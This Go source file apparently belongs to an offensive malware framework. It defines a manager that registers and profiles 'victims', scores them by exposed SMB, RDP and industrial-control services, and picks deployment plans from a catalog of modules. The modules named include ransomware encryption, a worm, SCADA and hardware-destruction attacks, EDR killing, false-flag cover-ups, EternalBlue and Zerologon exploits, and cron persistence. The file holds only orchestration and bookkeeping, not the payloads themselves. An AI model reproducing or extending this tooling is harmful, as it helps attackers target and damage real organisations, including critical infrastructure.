package appstate

import (
	"fmt"
	"strings"
	"sync"
	"time"
)

type DeploymentManager struct {
	state   *AppState
	victims map[string]*VictimProfile
	mu      sync.RWMutex
}

type VictimProfile struct {
	ID            string              `json:"id"`
	Hostname      string              `json:"hostname"`
	OS            string              `json:"os"`
	IP            string              `json:"ip"`
	Ports         []int               `json:"ports"`
	Services      []string            `json:"services"`
	ActiveModules []string            `json:"active_modules"`
	ModuleHistory []ModuleDeployEvent `json:"module_history"`
	FirstSeen     time.Time           `json:"first_seen"`
	LastSeen      time.Time           `json:"last_seen"`
	RiskScore     float64             `json:"risk_score"`
	Status        string              `json:"status"`
}

type ModuleDeployEvent struct {
	Module    string    `json:"module"`
	Action    string    `json:"action"`
	Timestamp time.Time `json:"timestamp"`
	Result    string    `json:"result"`
}

type DeploymentPlan struct {
	VictimID string   `json:"victim_id"`
	Modules  []string `json:"modules"`
	Strategy string   `json:"strategy"`
	Priority int      `json:"priority"`
}

var availablePayloads = map[string]PayloadDefinition{
	"ransomware/execute":          {Name: "ransomware/execute", Category: "ransomware", Phase: "encrypt", Risk: "high", RequiresRoot: true},
	"ransomware/scan":             {Name: "ransomware/scan", Category: "ransomware", Phase: "recon", Risk: "low", RequiresRoot: false},
	"ransomware/encrypt":          {Name: "ransomware/encrypt", Category: "ransomware", Phase: "encrypt", Risk: "high", RequiresRoot: false},
	"ransomware/hope_trap":        {Name: "ransomware/hope_trap", Category: "ransomware", Phase: "psychological", Risk: "medium", RequiresRoot: false},
	"ransomware/identity_destroy": {Name: "ransomware/identity_destroy", Category: "ransomware", Phase: "exfil", Risk: "high", RequiresRoot: false},
	"ransomware/worm":             {Name: "ransomware/worm", Category: "ransomware", Phase: "propagate", Risk: "high", RequiresRoot: true},
	"ransomware/scada_attack":     {Name: "ransomware/scada_attack", Category: "blockz", Phase: "scada", Risk: "critical", RequiresRoot: true},
	"ransomware/hardware_kill":    {Name: "ransomware/hardware_kill", Category: "blockz", Phase: "destruct", Risk: "critical", RequiresRoot: true},
	"blockz/genetic_evolve":       {Name: "blockz/genetic_evolve", Category: "blockz", Phase: "evolve", Risk: "medium", RequiresRoot: false},
	"blockz/deadman":              {Name: "blockz/deadman", Category: "blockz", Phase: "complete", Risk: "critical", RequiresRoot: false},
	"blockz/edr_kill":             {Name: "blockz/edr_kill", Category: "blockz", Phase: "evasion", Risk: "high", RequiresRoot: true},
	"blockz/deepfake":             {Name: "blockz/deepfake", Category: "blockz", Phase: "psychological", Risk: "high", RequiresRoot: false},
	"blockz/falseflag":            {Name: "blockz/falseflag", Category: "blockz", Phase: "coverup", Risk: "low", RequiresRoot: false},
	"blockz/iot_chain":            {Name: "blockz/iot_chain", Category: "blockz", Phase: "destruct", Risk: "critical", RequiresRoot: true},
	"exploit/eternalblue":         {Name: "exploit/eternalblue", Category: "exploit", Phase: "exploit", Risk: "high", RequiresRoot: true},
	"exploit/zerologon":           {Name: "exploit/zerologon", Category: "exploit", Phase: "exploit", Risk: "high", RequiresRoot: true},
	"post/persist_cron":           {Name: "post/persist_cron", Category: "post", Phase: "persist", Risk: "medium", RequiresRoot: true},
}

type PayloadDefinition struct {
	Name         string `json:"name"`
	Category     string `json:"category"`
	Phase        string `json:"phase"`
	Risk         string `json:"risk"`
	RequiresRoot bool   `json:"requires_root"`
}

func (s *AppState) NewDeploymentManager() *DeploymentManager {
	return &DeploymentManager{
		state:   s,
		victims: make(map[string]*VictimProfile),
	}
}

func (dm *DeploymentManager) RegisterVictim(hostname, osName, ip string, ports []int, services []string) *VictimProfile {
	dm.mu.Lock()
	defer dm.mu.Unlock()

	vp := &VictimProfile{
		ID:            fmt.Sprintf("VICTIM_%s_%d", hostname, time.Now().Unix()),
		Hostname:      hostname,
		OS:            osName,
		IP:            ip,
		Ports:         ports,
		Services:      services,
		ActiveModules: []string{},
		FirstSeen:     time.Now(),
		LastSeen:      time.Now(),
		Status:        "profiling",
	}

	dm.victims[vp.ID] = vp
	return vp
}

func (dm *DeploymentManager) ProfileVictim(victimID string) *VictimProfile {
	dm.mu.RLock()
	vp, ok := dm.victims[victimID]
	dm.mu.RUnlock()
	if !ok {
		return nil
	}

	dm.mu.Lock()
	vp.RiskScore = dm.calculateRiskScore(vp)
	vp.Status = "profiled"
	dm.mu.Unlock()

	return vp
}

func (dm *DeploymentManager) calculateRiskScore(vp *VictimProfile) float64 {
	score := 0.0

	if strings.Contains(strings.ToLower(vp.OS), "windows") {
		score += 0.3
	}
	if strings.Contains(strings.ToLower(vp.OS), "server") {
		score += 0.4
	}
	for _, svc := range vp.Services {
		switch strings.ToLower(svc) {
		case "ssh":
			score += 0.1
		case "smb", "rdp", "winrm":
			score += 0.3
		case "http", "https":
			score += 0.05
		case "modbus", "s7comm", "cip":
			score += 0.5
		}
	}
	for _, p := range vp.Ports {
		if p == 445 || p == 3389 || p == 502 || p == 102 {
			score += 0.2
		}
	}
	if score > 1.0 {
		score = 1.0
	}
	return score
}

func (dm *DeploymentManager) CreateDeploymentPlan(victimID string, moduleFilter string) (*DeploymentPlan, error) {
	dm.mu.RLock()
	vp, ok := dm.victims[victimID]
	dm.mu.RUnlock()
	if !ok {
		return nil, fmt.Errorf("victim not found: %s", victimID)
	}

	var selectedModules []string

	if moduleFilter != "" && moduleFilter != "all" {
		filters := strings.Split(moduleFilter, ",")
		for _, f := range filters {
			f = strings.TrimSpace(f)
			if _, exists := availablePayloads[f]; exists {
				selectedModules = append(selectedModules, f)
			}
		}
	} else {
		for name, pd := range availablePayloads {
			if dm.moduleMatchesVictim(pd, vp) {
				selectedModules = append(selectedModules, name)
			}
		}
	}

	strategy := "targeted"
	if len(selectedModules) <= 3 {
		strategy = "stealth"
	} else if len(selectedModules) >= 10 {
		strategy = "scorched_earth"
	}

	return &DeploymentPlan{
		VictimID: victimID,
		Modules:  selectedModules,
		Strategy: strategy,
		Priority: len(selectedModules),
	}, nil
}

func (dm *DeploymentManager) moduleMatchesVictim(pd PayloadDefinition, vp *VictimProfile) bool {
	if pd.RequiresRoot && vp.OS == "windows" {
		return false
	}
	if pd.Category == "blockz" && vp.RiskScore < 0.4 {
		return false
	}
	if pd.Risk == "critical" && vp.RiskScore < 0.6 {
		return false
	}
	return true
}

func (dm *DeploymentManager) DeployModule(victimID, moduleName string) error {
	dm.mu.RLock()
	vp, ok := dm.victims[victimID]
	dm.mu.RUnlock()
	if !ok {
		return fmt.Errorf("victim not found")
	}

	_, exists := availablePayloads[moduleName]
	if !exists {
		return fmt.Errorf("module not found: %s", moduleName)
	}

	dm.mu.Lock()
	vp.ActiveModules = append(vp.ActiveModules, moduleName)
	vp.ModuleHistory = append(vp.ModuleHistory, ModuleDeployEvent{
		Module: moduleName, Action: "deploy", Timestamp: time.Now(), Result: "pending",
	})
	vp.LastSeen = time.Now()
	vp.Status = "attacking"
	dm.mu.Unlock()

	return nil
}

func (dm *DeploymentManager) DeployPlan(plan *DeploymentPlan) map[string]string {
	results := make(map[string]string)
	for _, mod := range plan.Modules {
		err := dm.DeployModule(plan.VictimID, mod)
		if err != nil {
			results[mod] = fmt.Sprintf("FAILED: %v", err)
		} else {
			results[mod] = "DEPLOYED"
		}
	}
	return results
}

func (dm *DeploymentManager) GetAvailableModules() []PayloadDefinition {
	mods := make([]PayloadDefinition, 0, len(availablePayloads))
	for _, pd := range availablePayloads {
		mods = append(mods, pd)
	}
	return mods
}

func (dm *DeploymentManager) GetModuleCategories() map[string][]string {
	cats := make(map[string][]string)
	for name, pd := range availablePayloads {
		cats[pd.Category] = append(cats[pd.Category], name)
	}
	return cats
}

func (dm *DeploymentManager) ListVictims() []*VictimProfile {
	dm.mu.RLock()
	defer dm.mu.RUnlock()
	victims := make([]*VictimProfile, 0, len(dm.victims))
	for _, vp := range dm.victims {
		victims = append(victims, vp)
	}
	return victims
}

func (dm *DeploymentManager) GetVictim(victimID string) *VictimProfile {
	dm.mu.RLock()
	defer dm.mu.RUnlock()
	return dm.victims[victimID]
}
